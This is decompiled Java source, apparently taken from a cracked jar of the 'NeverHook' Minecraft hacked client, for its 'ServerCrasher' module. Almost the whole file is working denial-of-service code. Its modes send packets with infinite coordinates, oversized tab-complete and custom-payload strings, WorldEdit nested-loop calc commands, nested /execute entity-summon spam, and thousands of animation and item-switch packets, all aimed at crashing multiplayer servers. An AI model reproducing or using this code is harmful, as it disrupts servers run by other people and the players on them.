/*    */ package org.neverhook.client.feature.impl.misc;
/*    */ import io.netty.buffer.Unpooled;
/*    */ import java.util.Random;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.PacketBuffer;
/*    */ import net.minecraft.network.play.client.CPacketAnimation;
/*    */ import net.minecraft.network.play.client.CPacketCustomPayload;
/*    */ import net.minecraft.network.play.client.CPacketHeldItemChange;
/*    */ import net.minecraft.network.play.client.CPacketPlayer;
/*    */ import net.minecraft.network.play.client.CPacketTabComplete;
/*    */ import net.minecraft.util.EnumHand;
/*    */ import net.minecraft.util.math.BlockPos;
/*    */ import org.apache.commons.lang3.RandomUtils;
/*    */ import org.neverhook.client.event.events.impl.player.EventUpdate;
/*    */ import org.neverhook.client.feature.impl.Type;
/*    */ import org.neverhook.client.settings.Setting;
/*    */ import org.neverhook.client.settings.impl.ListSetting;
/*    */ import org.neverhook.client.settings.impl.NumberSetting;
/*    */ 
/*    */ public class ServerCrasher extends Feature {
/* 21 */   public ListSetting mode = new ListSetting("ServerCrasher Mode", "Infinity", () -> Boolean.valueOf(true), new String[] { "Infinity", "TabComplete", "WorldEdit", "Session", "OP", "WorldEdit2", "xACK", "IllegalSwitcher" });
/*    */   
/* 23 */   public NumberSetting delay = new NumberSetting("Delay", 1000.0F, 1.0F, 5000.0F, 1.0F, () -> Boolean.valueOf(this.mode.currentMode.equals("TabComplete")));
/*    */   
/*    */   public ServerCrasher() {
/* 26 */     super("ServerCrasher", "Test", Type.Misc);
/*    */     
/* 28 */     addSettings(new Setting[] { (Setting)this.delay });
/* 29 */     addSettings(new Setting[] { (Setting)this.mode });
/*    */   }
/*    */   
/*    */   @EventTarget
/*    */   public void onUpdate(EventUpdate event) {
/* 34 */     setSuffix(this.mode.currentMode);
/* 35 */     if (this.mode.currentMode.equals("Infinity")) {
/* 36 */       sendPacket((Packet)new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
/* 37 */       sendPacket((Packet)new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, (new Random()).nextBoolean()));
/* 38 */     } else if (this.mode.currentMode.equals("TabComplete")) {
/* 39 */       for (int i = 0; i < this.delay.getNumberValue(); i++) {
/* 40 */         double rand1 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
/* 41 */         double rand2 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
/* 42 */         double rand3 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
/* 43 */         mc.player.connection.sendPacket((Packet)new CPacketTabComplete("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎", new BlockPos(rand1, rand2, rand3), false));
/*    */       } 
/* 45 */     } else if (this.mode.currentMode.equals("WorldEdit")) {
/* 46 */       if (mc.player.ticksExisted % 6 == 0) {
/* 47 */         mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
/* 48 */         mc.player.sendChatMessage("//calculate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
/* 49 */         mc.player.sendChatMessage("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
/* 50 */         mc.player.sendChatMessage("//evaluate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
/* 51 */         mc.player.sendChatMessage("//eval for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
/*    */       } 
/* 53 */     } else if (this.mode.currentMode.equals("Session")) {
/* 54 */       for (int i = 0; i < 500; i++) {
/* 55 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 56 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|Brand", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 57 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 58 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BOpen", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 59 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 60 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|TrList", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 61 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 62 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|TrSel", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 63 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 64 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BEdit", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 65 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/* 66 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("뛠뎕곢邆転鞇뻡讉ꋒ뫠㪒潨牵汧獡㩳균鎩裣ꦉ닡릎")));
/*    */       } 
/* 68 */     } else if (this.mode.currentMode.equals("OP")) {
/* 69 */       for (int i = 0; i < 250; i++)
/* 70 */         mc.player.sendChatMessage("/execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ summon Villager"); 
/* 71 */     } else if (this.mode.currentMode.equals("WorldEdit2")) {
/* 72 */       for (int i = 0; i < 250; i++)
/* 73 */         mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("WECUI", (new PacketBuffer(Unpooled.buffer())).writeString("\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI"))); 
/* 74 */     } else if (this.mode.currentMode.equals("xACK")) {
/* 75 */       for (int i = 0; i < 5000; i++)
/* 76 */         mc.player.connection.sendPacket((Packet)new CPacketAnimation(EnumHand.OFF_HAND)); 
/* 77 */     } else if (this.mode.currentMode.equals("IllegalSwitcher")) {
/* 78 */       for (int i = 0; i < 550; i++) {
/* 79 */         for (int i2 = 0; i2 < 8; i2++)
/* 80 */           mc.player.connection.sendPacket((Packet)new CPacketHeldItemChange(i2)); 
/*    */       } 
/*    */     } 
/*    */   }
/*    */ }


/* Location:              C:\Users\Admin\OneDrive\Рабочий стол\NeverHook Crack.jar!\org\neverhook\client\feature\impl\misc\ServerCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */